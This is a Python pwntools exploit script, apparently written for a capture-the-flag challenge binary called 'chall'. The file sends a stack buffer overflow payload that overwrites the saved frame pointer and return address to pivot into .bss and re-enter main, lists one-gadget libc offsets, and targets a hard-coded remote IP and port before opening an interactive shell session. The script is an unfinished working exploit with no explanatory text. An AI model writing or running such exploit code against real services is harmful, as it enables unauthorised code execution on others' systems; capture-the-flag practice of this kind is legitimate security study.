#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./chall"

rhp1 = {"host":"13.231.207.73","port":9002}
rhp2 = {'host':"localhost",'port':12300}
context(os='linux',arch='amd64')
binf = ELF(FILENAME)

addr_main = 0x0040047e
ogs = [0x45216,0x4526a,0xf02a4,0xf1147]
addr_bss = 0x0000000000601010

def exploit(conn):
  target_addr = addr_bss

  pay = "A"* (0x20)
  pay += p64(target_addr - 0x20)
  pay += p64(addr_main+8)
  conn.send(pay)

  sleep(1)

  pay = "A"* (0x20)
  pay += p64(target_addr - 0x20)
  pay += p64(addr_main+8)
  raw_input()
  conn.send(pay)




if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
  elif sys.argv[1][0]=="r":
    conn = remote(rhp1["host"],rhp1["port"])
else:
    conn = remote(rhp2['host'],rhp2['port'])
exploit(conn)
conn.interactive()

